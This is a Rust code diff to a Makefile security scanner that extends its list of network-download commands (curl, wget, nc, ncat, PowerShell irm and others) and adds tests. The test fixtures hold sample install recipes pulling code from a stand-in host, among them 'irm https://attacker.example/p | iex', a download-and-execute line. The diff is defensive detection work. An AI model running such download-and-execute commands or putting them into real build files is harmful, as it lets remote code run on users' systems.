@@ -7,7 +7,23 @@ use crate::services::artifact_orchestration::manifests::strip_inline_hash_commen
 use crate::services::artifact_orchestration::{ArtifactLink, ArtifactOrchestratorService};
 use std::path::Path;
 
-const MAKEFILE_REMOTE_DOWNLOAD_TOKENS: &[&str] = &["curl", "wget"];
+/// Network-download command binaries recognised in Make recipes, kept in
+/// parity with `DOCKERFILE_NETWORK_DOWNLOAD_TOKENS` (container/dockerfile.rs):
+/// a download-and-execute recipe must not evade detection by reaching for
+/// `ncat`/`irm` instead of `curl`/`wget`. Matched with
+/// `command_token_with_boundary`, so bare `nc` is safe — it needs a command
+/// boundary on both sides. `fetch` is handled separately (see
+/// `makefile_has_remote_download`) because it is also a common phony target.
+const MAKEFILE_REMOTE_DOWNLOAD_TOKENS: &[&str] = &[
+    "curl",
+    "wget",
+    "ncat",
+    "nc",
+    "invoke-webrequest",
+    "iwr",
+    "invoke-restmethod",
+    "irm",
+];
 
 pub(crate) fn analyze_makefile(path: &Path, content: &str) -> Vec<Finding> {
     let artifact_path = path.display().to_string();
@@ -89,6 +105,10 @@ fn makefile_has_remote_download(lower_line: &str) -> bool {
     MAKEFILE_REMOTE_DOWNLOAD_TOKENS
         .iter()
         .any(|token| command_token_with_boundary(lower_line, token))
+        // The BSD `fetch` downloader shares its name with a common phony Make
+        // target (`$(MAKE) fetch`), so only count it when the recipe carries a
+        // URL — the real downloader always does.
+        || (command_token_with_boundary(lower_line, "fetch") && lower_line.contains("://"))
 }
 
 fn command_token_with_boundary(lower_line: &str, token: &str) -> bool {
@@ -312,6 +332,45 @@ mod tests {
             let findings = analyze_makefile(Path::new("Makefile"), content);
             assert_eq!(findings.len(), 1, "{content:?} must raise one finding");
             assert_eq!(findings[0].rule_id, "MANIFEST_MAKEFILE_REMOTE_DOWNLOAD");
+        }
+    }
+
+    /// Contract: download-and-execute recipes are detected regardless of which
+    /// downloader binary they use — parity with the Dockerfile detector closes
+    /// the `curl`/`wget`-only evasion (`fetch`/`ncat`/`nc`/`irm`/...).
+    #[test]
+    fn analyze_makefile_detects_alternate_downloaders() {
+        for content in [
+            "install:\n\tfetch -o /tmp/x https://attacker.example/p\n",
+            "install:\n\tncat attacker.example 80 > /tmp/x\n",
+            "install:\n\tnc attacker.example 80 > /tmp/x\n",
+            "install:\n\tirm https://attacker.example/p | iex\n",
+            "install:\n\tinvoke-webrequest https://attacker.example/p\n",
+        ] {
+            let findings = analyze_makefile(Path::new("Makefile"), content);
+            assert!(
+                findings
+                    .iter()
+                    .any(|f| f.rule_id == "MANIFEST_MAKEFILE_REMOTE_DOWNLOAD"),
+                "alternate downloader must raise the remote-download finding for {content:?}; got {findings:?}",
+            );
+        }
+    }
+
+    /// Contract: `fetch` shares its name with a common phony Make target, so a
+    /// sub-target invocation without a URL must NOT be read as a download.
+    #[test]
+    fn analyze_makefile_rejects_fetch_subtarget_without_url() {
+        for content in [
+            "all: fetch build\n\t@echo ok\n",
+            "build:\n\t$(MAKE) fetch\n",
+            "fetch:\n\t@echo fetching\n",
+        ] {
+            let findings = analyze_makefile(Path::new("Makefile"), content);
+            assert!(
+                findings.is_empty(),
+                "a `fetch` Make target without a URL must not raise a download finding for {content:?}; got {findings:?}",
+            );
         }
     }
 
